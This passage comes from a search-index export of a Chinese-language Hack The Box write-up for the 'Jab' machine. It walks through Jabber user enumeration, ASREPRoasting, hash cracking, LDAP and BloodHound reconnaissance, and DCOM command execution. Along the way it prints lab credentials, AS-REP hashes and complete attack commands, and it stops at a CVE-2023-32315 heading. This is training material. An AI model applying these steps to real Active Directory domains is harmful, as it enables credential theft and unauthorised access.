TRUE\nhighestCommittedUSN: 262616\ndsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,\n CN=Sites,CN=Configuration,DC=jab,DC=htb\ndnsHostName: DC01.jab.htb\ndefaultNamingContext: DC=jab,DC=htb\ncurrentTime: 20240323052215.0Z\nconfigurationNamingContext: CN=Configuration,DC=jab,DC=htb\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#jabberxmpp","title":"Jabber/XMPP","text":"<p>\u641c\u7d22\u4e00\u4e0b<code>Ignite Realtime Openfire Jabber</code>\uff0c\u5f97\u77e5Jabber\u662fXMPP\u7684\u65e7\u540d\uff0c\u5b83\u662f\u4e00\u79cd\u4ee5XML\u4e3a\u57fa\u7840\u7684\u5f00\u653e\u5f0f\u5373\u65f6\u901a\u4fe1\u534f\u3002Openfire\u662fIgnite Realtime\u8fd9\u4e2a\u5f00\u6e90\u793e\u533a\u4e0b\u7684\u5e94\u7528\u7a0b\u5e8f\u540d\u3002 \u641c\u4e86\u4e0b<code>Openfire exploit</code>\uff0c\u53d1\u73b0\u6700\u8fd1\u6709\u4e2a<code>CVE-2023-32315</code>\uff0c\u4ee5\u4e3a\u8fd9\u5c31\u662f\u7a81\u7834\u53e3\u4e86\u3002\u4e0d\u8fc7\u770b\u4e86\u4e0b\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u9488\u5bf99090\u7aef\u53e3\u7684Openfire Console\uff0c\u7528\u6765\u7ed5\u8fc7\u767b\u5f55\u8ba4\u8bc1\u4ee5\u53ca\u4f7f\u7528REC\u63d2\u4ef6\u3002</p> <p>Openfire Console Authentication Bypass Vulnerability with RCE plugin</p> <p>\u4e0d\u6b7b\u5fc3\uff0c\u60f3\u7740\u8fd9\u53f0\u673a\u5668\u662f\u4e0d\u662f\u5c06\u9ed8\u8ba4\u76849090\u7aef\u53e3\u6539\u4e86\uff0c\u4e8e\u662f\u8bbf\u95ee\u4e86jabber\u76f8\u5173\u7684\u6240\u6709\u7aef\u53e3\uff0c\u6ca1\u6709\u53d1\u73b0Console\u7f51\u9875\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#jabber","title":"\u8fde\u63a5Jabber\u83b7\u7684\u7528\u6237\u6e05\u5355","text":"<p>\u6ca1\u8f99\u4e86\uff0c\u611f\u89c9\u8981\u7814\u7a76\u4e00\u4e0b\u8fd9\u4e2aJabber\u7684\u4f7f\u7528\u3002\u53c8\u770b\u4e86\u773cwiki\u8bf4\u4f3c\u4e4e\u662f\u4e2a\u804a\u5929\u8f6f\u4ef6\uff0c\u4ee5\u53caXMPP\u662f\u5206\u5e03\u5f0f\u7684\u5373\u65f6\u901a\u4fe1\u7cfb\u7edf\uff0c\u7136\u540e\u6709\u5ba2\u6237\u7aef\u670d\u52a1\u7aef\u4ec0\u4e48\u7684\u3002\u90a3\u4e48\u4e0b\u8f7d\u4e2a\u5ba2\u6237\u7aef\uff0c\u8fde\u63a5\u76ee\u6807\u4e3b\u673a\u8fd9\u4e2a\u670d\u52a1\u7aef\u5e94\u8be5\u80fd\u53d1\u73b0\u4e9b\u4ec0\u4e48\u4fe1\u606f\uff1f \u95ee\u4e86\u4e0bChatGPT\u63a8\u8350\u4e86\u4e2a\u5ba2\u6237\u7aef\uff0c\u6211\u9009\u62e9\u4e86\u4f7f\u7528pidgin\u3002</p> <p></p> <p>\u6dfb\u52a0\u8d26\u53f7\uff1a</p> <p>\u7531\u4e8e\u52fe\u9009\u4e86\u201c\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u6b64\u65b0\u8d26\u53f7\u201d\uff0c\u6240\u4ee5\u8981\u6ce8\u518c\uff1a</p> <p>\u52fe\u9009\u542f\u7528\u8fdb\u884c\u8fde\u63a5\uff08\u4f3c\u4e4e\u521a\u6ce8\u518c\u7684\u53f7\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u8fde\u63a5\u4e0a\uff09\uff1a \u7136\u540e\u63a2\u7d22\u4e00\u4e0b\u8fd9\u4e2aXMPP\u5ba2\u6237\u7aef\u80fd\u5e72\u4ec0\u4e48\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u201c\u641c\u7d22\u7528\u6237\u201d\u7684\u9009\u9879</p> <p>\u6839\u636e\u63d0\u793a\uff0c\u90a3\u76f4\u63a5\u7528\u901a\u914d\u7b26\u8bd5\u8bd5\u641c\u7d22\u6240\u6709\u7528\u6237\uff1a</p> <p>\u7531\u4e8e\u65e0\u6cd5\u590d\u5236\u7528\u6237\u6e05\u5355\uff0c\u800c\u6211\u4eec\u53c8\u53d1\u73b0\u6709\u4e2a\u8c03\u8bd5\u7a97\u53e3\uff0c\u6253\u5f00\u540e\u518d\u6b21\u6267\u884c\u521a\u521a\u7684\u64cd\u4f5c\uff0c\u53ef\u4ee5\u53d1\u73b0\u8c03\u5f0f\u7a97\u53e3\u4ee5XML\u683c\u5f0f\u8f93\u51fa\u4e86\u6240\u6709\u7528\u6237\u3002\u70b9\u51fb\u4fdd\u5b58\u3002</p> <p>\u63d0\u53d6\u7528\u6237\u6e05\u5355\u4e2d\u7684Email\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ grep -oP '\\w+@jab.htb' purple-debug.log | uniq &gt; user.txt\n</code></pre></p> <p>\u81f3\u6b64\uff0c\u4f3c\u4e4e\u5361\u4f4f\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u529e\u4e86\uff0c\u8981\u5bc6\u7801\u55b7\u6d12\u611f\u89c9\u96be\u5ea6\u592a\u5927\u4e86\uff0c\u4e00\u70b9\u5bc6\u7801\u7b56\u7565\u90fd\u4e0d\u77e5\u9053\uff0c\u7eaf\u7eaf\u66b4\u7834\u611f\u89c9\u4e0d\u59a5\u3002</p> <p>\u60f3\u8d77\u6765\u4e4b\u524d\u6536\u85cf\u7684\u57df\u6e17\u900f\u601d\u7ef4\u5bfc\u56fe\uff0c\u673a\u4f1a\u96be\u5f97\uff0c\u53ef\u4ee5\u8bd5\u4e00\u4e0b\u662f\u5426\u6709\u6548\u3002 \u6839\u636e\u8fd9\u4efd\u601d\u7ef4\u5bfc\u56fe\uff0c\u5b9a\u4f4d\u5230\u201cgot username but no password\u201d\u7684\u4f4d\u7f6e\uff0c\u5927\u4f53\u4e0a\u6709\u4e24\u4e2a\u601d\u8def\uff0c\u4e00\u4e2a\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u5bc6\u7801\u55b7\u6d12\uff0c\u53e6\u4e00\u4e2a\u5c31\u662fASREPRoast\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#asreproast","title":"ASREPRoast","text":"<p>\u76f4\u63a5\u7167\u505a\u3002\u4e00\u5957\u4e0b\u6765\uff0c\u67093\u4e2a\u7528\u6237\u53ef\u4ee5\u65e0\u9884\u8ba4\u8bc1\u83b7\u5f97TGT\uff08hashcat\u683c\u5f0f\uff09\uff0c\u800c\u5176\u4e2d1\u4e2a\u7528\u6237\u51ed\u636e\u53ef\u4ee5\u7834\u89e3\uff1a<code>jmontgomery@jab.htb:Midnight_121</code> <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ impacket-GetNPUsers -outputfile GetNPUsers.hash -format hashcat -usersfile user.txt jab.htb/ -dc-ip 10.10.11.4\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ cat GetNPUsers.hash\n$krb5asrep$23$jmontgomery@jab.htb@JAB.HTB:172dc7296896cda97daacb0e737246ec$22a82ab6b10b1947da4abc5d605292d5aa8c6fe54635ecb4107023c122eba597c1a7fdd14cd605ee4a8b001a01fb9b29bfb57e28c99eebe8de30a1ea680619bbbd7a90779569e39359c9ee424dfb8ea6dff1bd3e62f1652b47457501ba344683749f293603629e68629c002db27bef1a30be11a4eb95860c37b23a7c1461a3f4c0bf95709ea69978db20f9bb2f2882461aec11c3a2807dc11f32c3adad849d6a4a4a617b8b1b13a4ee67a983813301833180cf51f7abd9b0476d8acfccb8fe64f4f9554f7fd0eaaac1e258b43497f2eb0c8ec3fa749e4f6bebd4cc8cd65c66f58855\n$krb5asrep$23$lbradford@jab.htb@JAB.HTB:12ab21d5362ed0607532dd32922102fd$8445081728b932a7aa56594712ca12a44836d26932e0b6a50057ec346b24b7316d405f86a4cffe6ea54b0bf54b33fd6cacd6e13f5a6795024bd95c6653309ffe042ac3a26b86c5e053986ae9be6d9b82b7d9f58c130616d8de1d2625f240ea84d791b2fdca85ecb8a2a3ecb787f4f02fd4d3bc54a3003552ae34caee05b5122690b487b996879769f1aa790b42ce96a1c1fcf8f9deef50abb93822945d5cb9e1f2c357c38a3ffc1100ac2491bde95abc9ede3e56ae97da0541170d186c14dca95e1524c6a7d6714683baec02841379405f1b4c7cf77de168f41d9c3c41cd083af4cb\n$krb5asrep$23$mlowe@jab.htb@JAB.HTB:f06a9e452c5fd320526d20b5f3c10651$cb7496554c06c770a201e3b9c700408c4b893a82da439b13b6cc24e0a45a0512c3a4e065df2b97962efdde07f4d4abad2649d3f972277696721bc5730d314c82bdd45673b8bb6a7f32aafe526e641ad53f0de456d01d612a1c35475d491b93460545095b093f9c8045623d43b661a37cf20d07e9f26a2f8dd705570ea9c865897423de702ea713ca042d41e4fd736d438f46af7ca7dec79fc2feedd63fa95d2032b927760aa4c7c4c8166e4d89899746ea36ac197f3af23be8863147db3ca30b81139677c2ec939b4b72471bbd0dcc8d25f5e868c116ac9afaf58d6f6076c598d21e\n\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ hashcat GetNPUsers.hash /usr/share/wordlists/rockyou.txt \nhashcat (v6.2.6) starting in autodetect mode\n\nOpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n==================================================================================================================================================\n* Device #1: cpu-haswell-AMD Ryzen 7 3700X 8-Core Processor, 1601/3266 MB (512 MB allocatable), 4MCU\n\nHash-mode was not specified with -m. Attempting to auto-detect hash mode.\nThe following mode was auto-detected as the only one matching your input hash:\n\n18200 | Kerberos 5, etype 23, AS-REP | Network Protocol\n\n (...)\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 0 secs\n\n$krb5asrep$23$jmontgomery@jab.htb@JAB.HTB:172dc7296896cda97daacb0e737246ec$22a82ab6b10b1947da4abc5d605292d5aa8c6fe54635ecb4107023c122eba597c1a7fdd14cd605ee4a8b001a01fb9b29bfb57e28c99eebe8de30a1ea680619bbbd7a90779569e39359c9ee424dfb8ea6dff1bd3e62f1652b47457501ba344683749f293603629e68629c002db27bef1a30be11a4eb95860c37b23a7c1461a3f4c0bf95709ea69978db20f9bb2f2882461aec11c3a2807dc11f32c3adad849d6a4a4a617b8b1b13a4ee67a983813301833180cf51f7abd9b0476d8acfccb8fe64f4f9554f7fd0eaaac1e258b43497f2eb0c8ec3fa749e4f6bebd4cc8cd65c66f58855:Midnight_121\nApproaching final keyspace - workload adjusted.\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#jmontgomery","title":"jmontgomery\u51ed\u636e\u4e0b\u7684\u63a2\u7d22","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#winrm","title":"winrm\u8fde\u63a5\u5931\u8d25","text":"<p>\u62ff\u5230\u4e00\u4e2a\u51ed\u636e\uff0c\u4e14\u57df\u63a7\u6709\u5f00\u653e5985\u7aef\u53e3\uff0c\u9996\u5148\u8be5\u60f3\u5230\u5c1d\u8bd5<code>evil-winrm</code>\u8fde\u63a5\u3002 \u4e0d\u8fc7\u7ed3\u679c\u5931\u8d25\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ evil-winrm -i 10.10.11.4 -u jmontgomery -p Midnight_121\n\nEvil-WinRM shell v3.5\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\nError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError\n\nError: Exiting with code 1\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#smb","title":"SMB\u8fde\u63a5\u5931\u8d25","text":"<p>\u90a3\u4e48\u4ece\u5934\u5f00\u59cb\uff0cSMB\u3001LDAP\u6536\u96c6\u4fe1\u606f\u3002</p> <p>SMB\u65e0\u6cd5\u767b\u9646\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ smbclient -L //10.10.11.4/ -U jab.htb/montgomery%Midnight_121  \nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#ldap","title":"LDAP\u65e0\u6709\u7528\u4fe1\u606f","text":"<p>LDAP\u4f3c\u4e4e\u8981\u6c42LDAPS\u8fde\u63a5\u3002 <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldap://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121'                                       \nldap_bind: Strong(er) authentication required (8)\n        additional info: 00002028: LdapErr: DSID-0C090389, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v4563\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldaps://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121' \nldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)\n</code></pre></p> <p>\u4f7f\u7528debug\u6a21\u5f0f\u770b\u4e86\u773c\uff0c\u4f3c\u4e4e\u662f\u56e0\u4e3a\u5ba2\u6237\u7aef\u4e0d\u4fe1\u4efb\u670d\u52a1\u5668\u7684SSL\u8bc1\u4e66\u3002 \u641c\u4e86\u4e0b\u89e3\u51b3\u65b9\u6cd5\u2014\u2014\u7528<code>export LDAPTLS_REQCERT=never</code>\u76f4\u63a5\u4e0d\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002 \u5148\u770b\u4e86\u773cjmontgomery\u5c5e\u4e8e\u54ea\u4e2aOU\uff0c\u5927\u81f4\u4e86\u89e3\u4e0bOU\u7ed3\u6784\u3002\u7136\u540e\u8bd5\u7740\u641c\u4e86\u641c\u51e0\u4e2aOU\u7684description\uff0c\u6ca1\u4ec0\u4e48\u6709\u7528\u4fe1\u606f\u3002 <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldaps://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121' -d 1\nldap_url_parse_ext(ldaps://10.10.11.4)\nldap_create\nldap_url_parse_ext(ldaps://10.10.11.4:636/??base)\nldap_sasl_bind\nldap_send_initial_request\nldap_new_connection 1 1 0\nldap_int_open_connection\nldap_connect_to_host: TCP 10.10.11.4:636\nldap_new_socket: 3\nldap_prepare_socket: 3\nldap_connect_to_host: Trying 10.10.11.4:636\nldap_pvt_connect: fd: 3 tm: -1 async: 0\nattempting to connect: \nconnect success\nTLS: peer cert untrusted or revoked (0x142)\nTLS: can't connect: (unknown error code).\nldap_err2string\nldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)\n\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ export LDAPTLS_REQCERT=never\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldaps://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121' -b \"DC=jab,DC=htb\" \"(userPrincipalName=jmontgomery@jab.htb)\"\ndn: CN=Joyce Montgomery,OU=Server Admin,OU=IT,OU=Corp,DC=jab,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Joyce Montgomery\nsn: Montgomery\nl: Belleville\npostalCode: 7109\ngivenName: Joyce\ndistinguishedName: CN=Joyce Montgomery,OU=Server Admin,OU=IT,OU=Corp,DC=jab,DC\n =htb\ninstanceType: 4\nwhenCreated: 20231027142621.0Z\nwhenChanged: 20240322054643.0Z\ndisplayName: Joyce Montgomery\nuSNCreated: 45753\nmemberOf: CN=Contractors,OU=Security Groups,OU=Corp,DC=jab,DC=htb\nuSNChanged: 262235\ndepartment: DevOps\nstreetAddress: 4554 Duke Lane\nname: Joyce Montgomery\nobjectGUID:: WlBjJbgLXEyNFGeZmPlfow==\nuserAccountControl: 4260352\nbadPwdCount: 6\ncodePage: 0\ncountryCode: 0\nbadPasswordTime: 133492008984698362\nlastLogoff: 0\nlastLogon: 133429072652390603\nlogonHours:: ////////////////////////////\npwdLastSet: 133492000755121222\nprimaryGroupID: 513\nobjectSid:: AQUAAAAAAAUVAAAABf2rKo+DQ34hQoIO8wYAAA==\naccountExpires: 0\nlogonCount: 2\nsAMAccountName: jmontgomery\nsAMAccountType: 805306368\nuserPrincipalName: jmontgomery@jab.htb\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=jab,DC=htb\ndSCorePropagationData: 20231027191223.0Z\ndSCorePropagationData: 16010101000000.0Z\nlastLogonTimestamp: 133555600035349598\nmsDS-SupportedEncryptionTypes: 0\n\n# refldaps://ForestDnsZones.jab.htb/DC=ForestDnsZones,DC=jab,DC=htb\n\n# refldaps://DomainDnsZones.jab.htb/DC=DomainDnsZones,DC=jab,DC=htb\n\n# refldaps://jab.htb/CN=Configuration,DC=jab,DC=htb\n\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldaps://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121' -b \"OU=IT,OU=Corp,DC=jab,DC=htb\" description          \ndn: OU=IT,OU=Corp,DC=jab,DC=htb\ndescription:: SW5mb3JtYXRpb24gVGVjaG5vbG9neSBwZXJzb25uZWwg\n\ndn: OU=HelpDesk,OU=IT,OU=Corp,DC=jab,DC=htb\ndescription:: SGVscCBEZXNrIHBlcnNvbm5lbCA=\n\ndn: CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=Corp,DC=jab,DC=htb\n\n (...)\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldaps://10.10.11.4 -D jmontgomery@jab.htb -w 'Midnight_121' -b \"CN=Configuration,DC=jab,DC=htb\" description | grep description\ndescription: The Personally Identifiable Information (PII) property specifies \ndescription: The Protected Health Information (PHI) property specifies whether\n (...)\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#jabber_1","title":"\u518d\u6b21\u767b\u5f55Jabber\u53d1\u73b0\u65b0\u51ed\u636e","text":"<p>\u5c1d\u8bd5\u7528\u8fd9\u4e2a\u53f7\u767b\u5f55pidgin\uff0c\u5728\u83dc\u5355\u53d1\u73b0\u201c\u6dfb\u52a0\u804a\u5929\u201d\u4e2d\u6709\u4e2a\u201c\u804a\u5929\u5ba4\u5217\u8868\u201d\u3002\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u53eb\u201cpentest2003\u201d\u7684\u804a\u5929\u5ba4\uff0c\u91cc\u9762\u63d0\u5230\u4e4b\u524d\u7684\u6e17\u900f\u6d4b\u8bd5\u4e2d\u7834\u89e3\u4e86\u4e00\u4e2a\u5e26SPN\u7684\u8d26\u53f7\uff08<code>svc_openfire:!@#$%^&amp;*(1qazxsw</code>\uff09\u3002\u4f3c\u4e4e\u5df2\u7ecf\u5220\u9664SPN\u4e86\uff0c\u4f46\u662f\u6ca1\u8bf4\u6539\u5bc6\u7801\u7684\u4e8b\u60c5\u3002\u53ef\u4ee5\u5c1d\u8bd5\u662f\u5426\u53ef\u4ee5\u5229\u7528\uff1f</p> <p> </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#svc_openfire","title":"svc_openfire\u51ed\u636e\u4e0b\u7684\u63a2\u7d22","text":"<p>\u7ee7\u7eed\u91cd\u590d\u524d\u9762\u7684\u6b65\u9aa4\uff0c\u7ed3\u679c\u4e00\u65e0\u6240\u83b7\u3002 \u4e8e\u662f\u53c8\u7ffb\u770b\u7740\u90a3\u4efd\u57df\u6e17\u900f\u601d\u7ef4\u5bfc\u56fe\uff0c\u76ee\u524d\u662f\u201cvalid credentials\u201d\u7684\u9636\u6bb5\u3002\u5176\u4e2d\u8bf4\u7684\u83b7\u53d6\u7528\u6237\u6e05\u5355\u3001\u679a\u4e3eSMB\u5171\u4eab\u3001LDAP\u4e4b\u524d\u90fd\u8bd5\u8fc7\u4e86\u6ca1\u4ec0\u4e48\u6709\u7528\u4fe1\u606f\u3002\u90a3\u5c31\u8f6c\u5411\u201cbloodhound\u201d\u770b\u770b\u5427\u3002</p> <p>\u53e6\u5916\uff0c\u679a\u4e3e\u7528\u6237\u548cSMB\u5171\u4eab\u770b\u4ed6\u7528\u7684CME\uff08CrackMapExec\uff09\uff0c\u60f3\u8d77\u6765\u4e4b\u524d\u770b\u5230\u8bf4CME\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\u4e86\uff0c\u73b0\u5728\u4f3c\u4e4eNetExec\uff08nxc\uff09\u662f\u5176\u66ff\u4ee3\u54c1\uff0c\u4e8e\u662f\u6b63\u597d\u5728\u8fd9\u53f0\u673a\u5668\u4e5f\u5b9e\u8df5\u4e86\u4e00\u4e0bNetExec\u3002\u7adf\u7136\u80fd\u679a\u4e3e\u51faSMB\u5171\u4eab\u5217\u8868\uff08\u524d\u9762\u7528<code>smbclient</code>\u90fd\u76f4\u63a5\u62a5\u9519\u4e0d\u80fd\u767b\u5f55\u6765\u7740\uff09\u3002\u8fd8\u633a\u795e\u5947\u7684\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#bloodhound","title":"BloodHound\u63a2\u7d22","text":"<p>\u9996\u5148\u770b\u5230\u57df\u6e17\u900f\u601d\u7ef4\u5bfc\u56fe\u4e2d\u7528\u7684\u547d\u4ee4\u662f<code>bloodhound-python</code>\uff0c\u5b89\u88c5\u6267\u884c\u540e\u603b\u662f\u62a5\u9519\uff08\u540e\u6765\u53d1\u73b0\u5176\u5b9e\u52a0\u5165<code>-ns</code>\u9009\u9879\u5c31\u80fd\u89e3\u51b3\uff0c\u5f53\u65f6\u6ca1\u61c2\uff09\u3002\u4e8e\u662f\u5012\u817e\u4e86\u4e00\u4e0b<code>nxc</code>\u53d1\u73b0\u5176ldap\u6a21\u5757\u4e5f\u80fd\u8c03\u7528bloodhound\uff0c\u4e8e\u662f\u7d22\u6027\u7528<code>nxc</code>\u89e3\u51b3\u4e86\u3002 <code>nxc ldap 10.10.11.4 -u svc_openfire -p '!@#$%^&amp;*(1qazxsw' --bloodhound -c all -ns 10.10.11.4</code></p> <p>\u7ed3\u679c\u8f93\u51fa\u4e00\u4e2azip\u6587\u4ef6\uff0c\u7136\u540e\u610f\u8bc6\u5230\u9700\u8981GUI\uff0c\u4e8e\u662f\u8fd8\u5f97\u5b89\u88c5\u5b8c\u6574\u7684bloodhound\u3002\u914d\u7f6e\u597d\u4e4b\u540e\u4e0a\u4f20zip\u7ed3\u679c\u6587\u4ef6\uff0c\u70b9\u4e86\u70b9\u9884\u5b9a\u4e49\u7684\u641c\u7d22\u6ca1\u53d1\u73b0\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f\uff08\u53ef\u80fd\u4e3b\u8981\u662f\u4e0d\u592a\u4f1a\u7528\uff09\u3002\u6700\u540e\u60f3\u5230\u76f4\u63a5\u641c\u641c\u76ee\u524d\u62ff\u5230\u7684\u4e24\u4e2a\u57df\u8d26\u6237\uff0c\u7ed3\u679c\u53d1\u73b0<code>svc_openfire</code>\u4f3c\u4e4e\u662f\u53ef\u5229\u7528\u7684\uff1a </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#executedcom","title":"ExecuteDCOM","text":"<p>\u641c\u4e86\u4e0b<code>ExecuteDCOM</code>\uff0c\u53d1\u73b0\u4e86\u503c\u5f97\u53c2\u8003\u7684\u6587\u7ae0\uff1a</p> <p>\u5229\u7528\u65b9\u6cd5\uff1ahttps://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html \u6269\u5c55\u77e5\u8bc6\uff1ahttps://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec#mmc20.application</p> <p>\u6309\u7167\u6587\u7ae0\u4e2d\u7684\u547d\u4ee4\u6267\u884c\uff0c\u53d1\u73b0\u5361\u5728\u201cSMBv3.0 dialect used\u201d\uff0c\u6700\u540e\u53d1\u73b0\u7528<code>-nooutput</code>\u9009\u9879\u5c31\u597d\u4e86\uff1a \u56e0\u4e3a\u5361\u5728SMB\u8fde\u63a5\uff0c\u800chelp\u770b\u8fd9\u4e2a\u9009\u9879\u8bf4\u201cno SMB connection created\u201d\u3002 \u800c\u540e\u7ec6\u770b\u4e0a\u9762\u6587\u7ae0\u63d0\u5230\u7684<code>-silentcommand</code>\uff0c\u8bd5\u4e86\u4e0b\u4e5f\u884c\uff0c\u53ef\u80fd\u7406\u7531\u4e00\u6837\uff0c\u5c31\u662f\u6587\u7ae0\u91cc\u8bf4\u7684\u201csince the script is using an SMB share to write and fetch the output, and our low-privileged user cannot write to any.\u201d\uff1f</p> <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&amp;*(1qazxsw'@10.10.11.4 \"whoami\" -object MMC20\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] SMBv3.0 dialect used\n^C[-] \n\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&amp;*(1qazxsw'@10.10.11.4 \"whoami\" -object MMC20 -nooutput\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ \n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#initial-access","title":"Initial Access","text":"<p>\u7531\u4e8e\u65e0\u6cd5\u8f93\u51fa\u547d\u4ee4\u7ed3\u679c\u5230\u7ec8\u7aef\uff0c\u4e3a\u4e86\u9a8c\u8bc1\u547d\u4ee4\u662f\u5426\u771f\u7684\u88ab\u6267\u884c\uff0c\u4e8e\u662f\u5c1d\u8bd5ping\u81ea\u5df1\u5e76\u76d1\u542c\u7f51\u5361\uff0c\u53d1\u73b0\u6536\u5230ping\u5305\u2014\u2014\u5373\u547d\u4ee4\u53ef\u6210\u529f\u6267\u884c\uff1a </p> <p>\u63a5\u4e0b\u6765\u5c31\u51c6\u5907\u53cd\u5f39shell\uff0c\u6210\u529f\u63a5\u6536\uff1a </p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#flag-user","title":"flag: user","text":"<p>svc_openfire\u7528\u6237\u7684\u684c\u9762\u5c31\u6709flag\uff1a <pre><code>PS C:\\Users\\svc_openfire\\desktop&gt; ls\n\n\n    Directory: C:\\Users\\svc_openfire\\desktop\n\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \n-ar---        3/24/2024   3:20 AM             34 user.txt                                                              \n\n\nPS C:\\Users\\svc_openfire\\desktop&gt; cat user.txt\n501 (...) d2e\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#internal-recon","title":"Internal Recon","text":"<p>\u5728\u7aef\u53e3\u4fe1\u606f\u4e2d\u53d1\u73b0\u5f00\u653e\u4e86\u672c\u5730\u7aef\u53e39090\u2014\u2014\u5373\u6700\u5f00\u59cb\u6211\u4eec\u8c37\u6b4c\u641c\u5230\u7684<code>CVE-2023-32315</code>\u3002\u539f\u6765\u662f\u5728\u8fd9\u91cc\u7528\u554a\u2026\u2026</p> <pre><code>PS C:\\Users\\svc_openfire\\Desktop&gt; netstat -anop tcp |findstr LISTEN\n (...)\n  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3128\n  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3128\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#poc-cve-2023-32315-like","title":"PoC (CVE-2023-32315 